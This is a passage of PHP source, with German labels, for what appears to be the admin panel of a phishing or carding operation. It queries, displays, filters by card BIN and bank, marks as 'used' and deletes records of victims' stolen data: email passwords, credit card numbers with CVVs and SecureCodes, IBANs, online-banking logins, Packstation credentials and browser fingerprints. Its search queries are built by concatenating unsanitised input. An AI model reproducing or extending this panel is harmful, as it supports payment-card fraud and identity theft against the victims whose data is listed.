			$query = 'SELECT `id`, `username`, `vorname`, `nachname`,  `adresse`, `ort` FROM ' . $myTable;
			
		} else if ($cctyp != null) {
			$query .= ' WHERE category LIKE "' . $cctyp . '"';
			
		} else if ($bank != null) {
			$query .= ' WHERE bank LIKE "' . $bank . '"';
			
		} else if ($level != null) {
			$query .= ' WHERE binlevel LIKE "' . $level . '"';
			
		} else if ($city != null) {
			$query .= ' WHERE ort LIKE "' . $city . '"';
			
		} else {
			$bins = explode(",", $bin);
			$query .= ' WHERE ';
			
			for ($i = 0; $i < count($bins); $i++) {
				$query .= ' ccnr LIKE CONCAT("' . $bins[$i] . '", \'%\') ';
				
				if (count($bins) -1 != $i) {
					$query .= 'OR';
				}
			}
		}
		
		$_SESSION['delete_shown_ccs_query'] = $query;
		
		if (!($stmt = $mySQLcon->prepare($query))) {
			die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}

		if (!$stmt->execute()) {
			die("Execute failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}
		
		$out_id = NULL;
		$out_time = NULL;
		
		$out_user = NULL;
		$out_pass = NULL;
		$out_vorname = NULL;
		$out_nachname = NULL;
		$out_dob = NULL;
		$out_adresse = NULL;
		$out_plz = NULL;
		$out_ort = NULL;
		$out_tlfnr = NULL;
		$out_handynr = NULL;
		
		$out_ps_nr = NULL;
		$out_ps_pw = NULL;
		
		$out_ccnr = NULL;
		$out_ccdate = NULL;
		$out_cvv = NULL;
		$out_limit = NULL;
		
		$out_sc = NULL;
		$out_sk = NULL;
		
		$out_notiz = NULL;
		
		$out_kto = NULL;
		$out_blz = NULL;
		$out_iban = NULL;
		$out_bic = NULL;
		
		$out_ob_user = NULL;
		$out_ob_pass = NULL;
		
		$out_brand = NULL;
		$out_bank2 = NULL;
		$out_country = NULL;
		$out_category = NULL;
		$out_level = NULL;
		
		$vic_info_lang = NULL;
		$vic_info_browser = NULL;
		$vic_info_os = NULL;
		$vic_info_screen = NULL;
		$vic_info_plugins = NULL;
		$vic_info_java = NULL;
		$vic_info_flash = NULL;
		$vic_info_silver = NULL;
		$vic_info_mime = NULL;
		$vic_info_fonts = NULL;
		
		$out_domain = NULL;
		$out_useragent = NULL;
		$out_ip = NULL;
		
		$out_used = NULL;
		
		if (!$checkBlacklist) {
			if (!$stmt->bind_result($out_id, $out_time, $out_user, $out_pass, 
												 $out_vorname, $out_nachname, $out_dob, $out_adresse, $out_plz, $out_ort, $out_tlfnr, $out_handynr, $out_ps_nr, $out_ps_pw,
												 $out_ccnr, $out_ccdate, $out_cvv, $out_limit, $out_sc, $out_sk, $out_notiz,
												 $out_kto, $out_blz, $out_iban, $out_bic, $out_ob_user, $out_ob_pass,
												 $out_brand, $out_bank2, $out_country, $out_category, $out_level,
												 $vic_info_lang, $vic_info_browser, $vic_info_os, $vic_info_screen, $vic_info_plugins, $vic_info_java, $vic_info_flash, $vic_info_silver, $vic_info_mime, $vic_info_fonts,
												 $out_domain, $out_useragent, $out_ip, $out_used)) {
												 
				die("Binding output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
			}
		} else {
			if (!$stmt->bind_result($out_id, $out_user, $out_vorname, $out_nachname, $out_adresse, $out_ort)) {
				die("Binding output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
			}
		}

		while ($stmt->fetch()) {
			$mark_used_id_array[] .= $out_id;
			
			if ($searchMailPass) {
				$count++;
				$result .= $out_user . ':' . $out_pass . '<br/>';
				
			} else if ($checkBlacklist) {
				$badWords_arr = explode("|", $badWords);
				unset($_SESSION['delete_shown_ccs_query']);
				for ($j = 0; $j < count($badWords_arr); $j++) {
					
					if (strpos($out_user, $badWords_arr[$j]) !== false || strpos($out_vorname, $badWords_arr[$j]) !== false || strpos($out_nachname, $badWords_arr[$j]) !== false || 
						strpos($out_adresse, $badWords_arr[$j]) !== false || strpos($out_ort, $badWords_arr[$j]) !== false) {
						$result .= $out_id  . ',' . $out_user  . ',' . $out_vorname  . ',' . $out_nachname  . ',' . $out_adresse  . ',' . $out_ort .'<br/><br/>';
						
						$count++;
						$_SESSION['delete_shown_ccs_query'] .= $out_id . "|";
						
						break;
					}
				}
				
			} else {
				$count++;
				$result .= '
								<b>#ID</b>: ' . $out_id  . ' | 
								<b>Datum</b>: ' . $out_time  . ' | 
								<b>E-Mail</b>: ' . htmlspecialchars($out_user)  . ' | 
								<b>Passwort</b>: ' . htmlspecialchars($out_pass)  . ' | 
								<b>Vorname</b>: ' . htmlspecialchars($out_vorname)  . ' | 
								<b>Nachname</b>: ' . htmlspecialchars($out_nachname)  . ' | 
								<b>Geburtsdatum</b>: ' . htmlspecialchars($out_dob)  . ' | 
								<b>Adresse</b>: ' . htmlspecialchars($out_adresse)  . ' | 
								<b>Postleitzahl</b>: ' . htmlspecialchars($out_plz)  . ' | 
								<b>Wohnort</b>: ' . htmlspecialchars($out_ort)  . ' | 
								<b>Telefonnummer</b>: ' . htmlspecialchars($out_tlfnr)  . ' | 
								<b>Handynummer</b>: ' . htmlspecialchars($out_handynr)  . ' | 
								<b>Packstation PostNummer</b>: ' . htmlspecialchars($out_ps_nr)  . ' | 
								<b>Packstation Passwort</b>: ' . htmlspecialchars($out_ps_pw)  . ' | 
								 | ';
								
								if (!$fi_search) {
									if ($out_ccnr != "skipped") {
										$result .= '<b>Kreditkartennummer</b>: ' . htmlspecialchars($out_ccnr)  . ' | 
										<b>G&uuml;ltigkeit</b>: ' . $out_ccdate  . ' | 
										<b>Pr&uuml;fziffer</b>: ' . htmlspecialchars($out_cvv)  . ' | 
										<b>Limit</b>: ' . htmlspecialchars($out_limit)  . ' | 
										<b>Securecode</b>: ' . htmlspecialchars($out_sc)  . ' | 
										<b>Servicekartennummer</b>: ' . htmlspecialchars($out_sk)  . ' | 
										<b>Marke</b>: ' . htmlspecialchars($out_brand)  . ' | 
										<b>Bank</b>: ' . htmlspecialchars($out_bank2)  . ' | 
										<b>Land</b>: ' . htmlspecialchars($out_country)  . ' | 
										<b>Kategorie</b>: ' . htmlspecialchars($out_category)  . ' | 
										<b>Level</b>: ' . htmlspecialchars($out_level)  . ' | ';
									}
									
									$result .= '<b>Kontonummer</b>: ' . htmlspecialchars($out_kto)  . ' | 
									<b>Bankleitzahl</b>: ' . htmlspecialchars($out_blz)  . ' | 
									<b>IBAN</b>: ' . htmlspecialchars($out_iban)  . ' | 
									<b>BIC</b>: ' . htmlspecialchars($out_bic)  . ' | 
									<b>OB-Login</b>: ' . htmlspecialchars($out_ob_user)  . ' | 
									<b>OB-Pass</b>: ' . htmlspecialchars($out_ob_pass)  . ' | ';
								}
								
								if ($show_vic_infos) {
									$result .= '<b>Sprache(n)</b>: ' . htmlspecialchars($vic_info_lang)  . ' | 
									<b>Browser</b>: ' . htmlspecialchars($vic_info_browser)  . ' | 
									<b>Betriebssystem</b>: ' . htmlspecialchars($vic_info_os)  . ' | 
									<b>Screen-Resolution</b>: ' . htmlspecialchars($vic_info_screen)  . ' | 
									<b>Plugins</b>: ' . htmlspecialchars($vic_info_plugins)  . ' | 
									<b>Java aktiv? Version?</b>: ' . htmlspecialchars($vic_info_java)  . ' | 
									<b>Flash aktiv? Version?</b>: ' . htmlspecialchars($vic_info_flash)  . ' | 
									<b>Silverlight aktiv? Version?</b>: ' . htmlspecialchars($vic_info_silver)  . ' | 
									<b>Mimetypes</b>: ' . htmlspecialchars($vic_info_mime)  . ' | 
									<b>Fonts</b>: ' . htmlspecialchars($vic_info_fonts)  . ' | ';
								}
								
								if (!empty($out_notiz)) {
									$result .= '<b>Notiz</b>: ' . htmlspecialchars($out_notiz)  . ' | ';
								}
								
								$ip_address = null;
								if (strpos($out_ip, ',') !== false) {
									$ip_address = explode(",", $out_ip)[0];
								} else {
									$ip_address = $out_ip;
								}
									
				$result .= 	'
								<b>Useragent</b>: ' . $out_useragent  . ' | 
								<b>IP-Adresse</b>: ' . $ip_address  . ' | 
								<b>IP-Hostname</b>: ' . gethostbyaddr($ip_address)  . ' | 
								<b>Benutzt?</b>: ' . (($out_used == 0) ? "N" : "Y")  . '
								<br/><br/> ';
			}
		}

		$stmt->close(); 

		if (empty($result)) {
			$result = "N / A";
		}
		
		return array($count, $result);
	}
	
	function getCheckedIDs($array) {
		$idArray = array();
	
		foreach($array as $key => $value) {
			if (substr($key, 0, 3) == "cb_") {
				if ($value == "on") {
					$id =  substr($key, 3);
				
					if (ctype_digit($id)) {
						$idArray[] = $id;
					}
				}
			} 
		}
		
		return $idArray;
	}
	
	function remove($id, $truncate = false, $removeCC = false, $removeNoCC = false, $removeELV = false, $removeMPonly = false, $removeOB = false) {
		global $mySQLcon;
		global $myTable;
		
		$query = null;

		if ($truncate) {
			$query = 'TRUNCATE ' . $myTable;
		} else if ($removeCC) {
			$query = 'DELETE FROM `' . $myTable . '` WHERE ccnr != "N / A" AND ccnr != "skipped"';
		} else if ($removeNoCC) {
			$query = 'DELETE FROM `' . $myTable . '` WHERE ccnr LIKE "N / A"';
		} else if ($removeELV) {
			$query = 'DELETE FROM `' . $myTable . '` WHERE ccnr LIKE "skipped"';
		} else if ($removeMPonly) {
			$query = 'DELETE FROM `' . $myTable . '` WHERE vorname LIKE "N / A"';
		} else if ($removeOB) {
			$query = 'DELETE FROM `' . $myTable . '` WHERE ob_login != "N / A"';
		} else {
			$query = 'DELETE FROM `' . $myTable . '` WHERE id=?';
		}
		
		$stmt = $mySQLcon->stmt_init();
		
		if (!$stmt ->prepare($query)) {
			die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}
		
		if ($id != null) {
			if (!$stmt ->bind_param("i", $id)) {
				$_SESSION['saveErr'] = "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
			}
		}
		
		if (!$stmt->execute()) {
			die("Execute failed: (" . $stmt->errno . ") " . $stmt->error);
		}

		$stmt ->close();
	}
	
	function mark($used, $idArray) {
		global $mySQLcon;
		global $myTable;
		
		for ($i = 0; $i < count($idArray); $i++) {
			
			$query = "UPDATE `" . $myTable . "` SET used=? WHERE id=?";

			$stmt = $mySQLcon->stmt_init();
		
			if (!$stmt ->prepare($query)) {
				die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
			}
		
			if (!$stmt ->bind_param("ii", $used, $idArray[$i])) {
				die("Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error);
			}
		
			if (!$stmt->execute()) {
				die("Execute failed: (" . $stmt->errno . ") " . $stmt->error);
			}

			$stmt ->close();
		}
		return (join(", ", $idArray));
	}
	
	function convert_Database() {
		global $mySQLcon;
		global $myTable;
		
		$stmt = $mySQLcon->stmt_init();
		
		if ($stmt->prepare("ALTER TABLE $myTable ADD timestamp VARCHAR(250);")) {
			$stmt->execute();
			$stmt->close();
		}
		
		$query = 'SELECT `id`, `logtime` FROM ' . $myTable;
		
		if (!($stmt = $mySQLcon->prepare($query))) {
			die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}

		if (!$stmt->execute()) {
			die("Execute failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}

		$out_id = NULL;
		$out_time = NULL;
		
		if (!$stmt->bind_result($out_id, $out_time)) {
			die("Binding output parameters failed: (" . $stmt->errno . ") " . $stmt->error);
		}
		$stmt->store_result();

		while ($stmt->fetch()) {
			$s_date = str_replace(":", ".", str_replace(" - ", ".", $out_time));
			$date_split = explode(".", $s_date);
			
			$timestamp = mktime($date_split[0], $date_split[1], $date_split[2], $date_split[4], (int)$date_split[3], $date_split[5]);
			
			$stmt2 = $mySQLcon->stmt_init();
			$query = "UPDATE $myTable SET `timestamp` = ? WHERE `id`=?";
			
			if ($stmt2->prepare($query)) {
				
				if (!$stmt2 ->bind_param("ss", $timestamp, $out_id)) {
					die("Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error);
				}
			
				if (!$stmt2->execute()) {
					die("Execute failed: (" . $stmt->errno . ") " . $stmt->error);
				}

				$stmt2 ->close();
			} else { 
				die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
			}
		}

		$stmt->close();
	}
	
	function addNewCCData($arrData, $rem = false) {
		global $mySQLcon;
		
		if (!$rem) {
			if (strpos($_POST['tb_cc_bin'] , ",") !== false) {
				$bin_array = explode(",", $_POST['tb_cc_bin']);
				
				for ($i = 0; $i < count($bin_array); $i++) {
					addCCData($bin_array[$i], $arrData);
				}
			} else {
				addCCData($arrData['tb_cc_bin'], $arrData);
			}
		} else {
			$query = 'DELETE FROM `cc_settings` WHERE id=?';
		
			$stmt = $mySQLcon->stmt_init();
			if (!$stmt ->prepare($query)) {
				die ("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
			}
			
			if (!$stmt ->bind_param("i", $arrData['remove_CC_Data'])) {
				die ("Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error);
			}
			
			if (!$stmt->execute()) {
				die ("Execute failed: (" . $stmt->errno . ") " . $stmt->error);
			}

			$stmt ->close();
		}
	
		return null;
	}
	
	function addCCData($bin, $arrData) {
		global $mySQLcon;
		
		$query = "INSERT INTO `cc_settings` (`cc_bin`, `cc_typ`, `cc_bcolor`, `cc_fcolor`) VALUES (?, ?, ?, ?)";
		$stmt = $mySQLcon->stmt_init();

		if (!$stmt ->prepare($query)) {
			die ("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}
		
		if (!$stmt ->bind_param("ssss", $bin, $arrData['tb_cc_typ'], $arrData['tb_cc_bcolor'], $arrData['tb_cc_fcolor'])) {
			die ("Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error);
		}
		
		if (!$stmt->execute()) {
			die ("Execute failed: (" . $stmt->errno . ") " . $stmt->error);
		}

		$stmt ->close();
	}
	
	function saveSettings($arrData) {
		global $mySQLcon;
		
		$query = "UPDATE `panel_settings` SET badWords=?, showLastLogs=?, show_Logs_CC=?, show_Logs_ELV=?, show_Logs_FI=?, show_Mail_Pass=?, collapse_in_cc=?, collapse_in_elv=?, collapse_in_fullinfo=?, collapse_in_mailpass=?, 
		collapse_in_cc_search=?, collapse_in_log_search=?, collapse_in_mail_search=?, adminUsername=?, adminPassword=?, show_vic_infos=?";

		$settings_show_Logs_CC = (isset($arrData['show_Logs_CC']) ? "1" : "0");
		$settings_show_Logs_ELV = (isset($arrData['show_Logs_ELV']) ? "1" : "0");
		$settings_show_Logs_FI = (isset($arrData['show_Logs_FI']) ? "1" : "0");
		$settings_show_Mail_Pass = (isset($arrData['show_Mail_Pass']) ? "1" : "0");

		$settings_collapse_in_cc = (isset($arrData['collapse_in_cc']) ? "1" : "0");
		$settings_collapse_in_elv = (isset($arrData['collapse_in_elv']) ? "1" : "0");
		$settings_collapse_in_fullinfo = (isset($arrData['collapse_in_fullinfo']) ? "1" : "0");
		$settings_collapse_in_mailpass = (isset($arrData['collapse_in_mailpass']) ? "1" : "0");
		
		$settings_collapse_in_cc_search = (isset($arrData['collapse_in_cc_search']) ? "1" : "0");
		$settings_collapse_in_log_search = (isset($arrData['collapse_in_log_search']) ? "1" : "0");
		$settings_collapse_in_mail_search = (isset($arrData['collapse_in_mail_search']) ? "1" : "0");
		
		$settings_show_vic_infos = (isset($arrData['show_vic_infos']) ? "1" : "0");
	
		$stmt = $mySQLcon->stmt_init();
	
		if (!$stmt ->prepare($query)) {
			return ("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
		}
	
		if (!$stmt ->bind_param("ssssssssssssssss", $arrData['tb_badwords'], $arrData['tb_log_count'],  $settings_show_Logs_CC, $settings_show_Logs_ELV, $settings_show_Logs_FI, $settings_show_Mail_Pass, $settings_collapse_in_cc, 
			$settings_collapse_in_elv, $settings_collapse_in_fullinfo, $settings_collapse_in_mailpass, $settings_collapse_in_cc_search, $settings_collapse_in_log_search, $settings_collapse_in_mail_search, $arrData['tb_panel_username'], $arrData['tb_panel_passwort'], $settings_show_vic_infos)) {
			return ("Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error);
		}
	
		if (!$stmt->execute()) {
			return ("Execute failed: (" . $stmt->errno . ") " . $stmt->error);
		}

		$stmt ->close();
		
		return null;
	}
?>